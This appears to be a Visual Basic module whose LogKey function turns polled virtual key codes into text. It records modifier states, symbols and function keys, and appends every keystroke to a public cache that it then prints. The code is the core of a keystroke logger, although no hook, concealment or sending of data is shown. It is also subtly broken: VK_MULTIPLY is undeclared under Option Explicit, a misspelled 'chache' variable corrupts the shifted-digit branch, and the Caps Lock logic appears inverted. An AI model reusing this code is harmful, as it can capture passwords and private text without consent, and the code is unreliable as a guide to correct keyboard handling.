Attribute VB_Name = "core"
Option Explicit

Public Cache As String

Public Function LogKey(KeyCode) As String
    
    Dim chache
    Dim AltKey As Boolean
    Dim CtrlKey As Boolean
    Dim ShiftKey As Boolean
    
    Dim NumLock As Boolean
    Dim CapsLock As Boolean
    Dim ScrollLock As Boolean
    
    Dim Key As String
    Dim Value As Long
    Const NumericSymbols = ")!@#$%^&*("
    
    Const VK_ADD = &H6B
    Const VK_BACK = &H8
    Const VK_DECIMAL = &H6E
    Const VK_DELETE = &H2E
    Const VK_DIVIDE = &H6F
    Const VK_DOWN = &H28
    Const VK_END = &H23
    Const VK_ESCAPE = &H1B
    Const VK_F1 = &H70
    Const VK_F24 = &H87
    Const VK_NUMPAD0 = &H60
    Const VK_NUMPAD9 = &H69
    Const VK_RETURN = &HD
    Const VK_SPACE = &H20
    Const VK_SUBTRACT = &H6D
    Const VK_TAB = &H9
    Const VK_SHIFT = &H10
    Const VK_CONTROL = &H11
    Const VK_MENU = &H12
    Const VK_CAPITAL = &H14
    
    If KeyCode = VK_SHIFT Then Exit Function
    If KeyCode = VK_CONTROL Then Exit Function
    If KeyCode = VK_MENU Then Exit Function
    If KeyCode = VK_CAPITAL Then Exit Function
    
    ShiftKey = Not GetAsyncKeyState(VK_SHIFT) = 0
    CtrlKey = Not GetAsyncKeyState(VK_CONTROL) = 0
    AltKey = Not GetAsyncKeyState(VK_MENU) = 0
    
    CapsLock = Not GetKeyState(VK_CAPITAL) = 0
    
    CapsLock = Not (ShiftKey Xor CapsLock)
    
    If KeyCode >= &H30 And KeyCode <= &H39 Then
        
        Value = KeyCode - &H30
        If CapsLock Then
            Key = Key & CStr(Value)
        Else
            Key = chache & Mid(NumericSymbols, Value + 1, 1)
        End If
        
        GoTo Finnish
    End If
      
    If KeyCode >= &H41 And KeyCode <= &H5A Then
        If CapsLock Then
            Key = Key & LCase(Chr(KeyCode))
        Else
            Key = Key & UCase(Chr(KeyCode))
        End If
        GoTo Finnish
    End If
    
    If KeyCode >= VK_NUMPAD0 And KeyCode <= VK_NUMPAD9 Then
        Key = Key & CStr(KeyCode - VK_NUMPAD0)
        GoTo Finnish
    End If
    
    If KeyCode >= VK_F1 And KeyCode <= VK_F24 Then
        Key = Key & vbCrLf & "[F" & CStr((KeyCode - VK_F1) + 1) & "]" & vbCrLf
        GoTo Finnish
    End If
    
    Select Case KeyCode
        Case VK_BACK:
            Key = Key & "[<-]"
            '//Cache = Left(Cache, Len(Cache) - 1) '// added but commented : for the user if mis-type a keyword
            '//Debug.Print Cache
            '//LogKey = Cache
            '//Exit Function
        Case VK_TAB: Key = Key & vbTab
        Case VK_RETURN: Key = Key & vbCrLf
        Case VK_ESCAPE: Key = Key & vbCrLf & "[Esc]" & vbCrLf
        Case VK_SPACE: Key = Key & " "
        Case VK_DELETE: Key = Key & "[Del]"
        Case VK_MULTIPLY: Key = Key & "*"
        Case VK_ADD: Key = Key & "+"
        Case VK_SUBTRACT: Key = Key & "-"
        Case VK_DECIMAL: Key = Key & "."
        Case VK_DIVIDE: Key = Key & "/"
        Case 192: Key = Key & IIf(ShiftKey, "~", "`")
        Case 189: Key = Key & IIf(ShiftKey, "_", "-")
        Case 187: Key = Key & IIf(ShiftKey, "+", "=")
        Case 219: Key = Key & IIf(ShiftKey, "{", "[")
        Case 221: Key = Key & IIf(ShiftKey, "}", "]")
        Case 220: Key = Key & IIf(ShiftKey, "|", "\")
        Case 186: Key = Key & IIf(ShiftKey, ":", ";")
        Case 222: Key = Key & IIf(ShiftKey, """", "'")
        Case 188: Key = Key & IIf(ShiftKey, "<", ",")
        Case 190: Key = Key & IIf(ShiftKey, ">", ".")
        Case 191: Key = Key & IIf(ShiftKey, "?", "/")
        Case Else ' do nothing
    End Select
    
Finnish:
    If Key = "" Then Exit Function
    If CtrlKey Or AltKey Then Key = "[" & Key & "]"
    If CtrlKey Then Key = "[CTRL]+" & Key
    If AltKey Then Key = "[Alt]+" & Key
    
    Cache = Cache & Key
    
    Debug.Print Cache
    
    LogKey = Cache
    
End Function
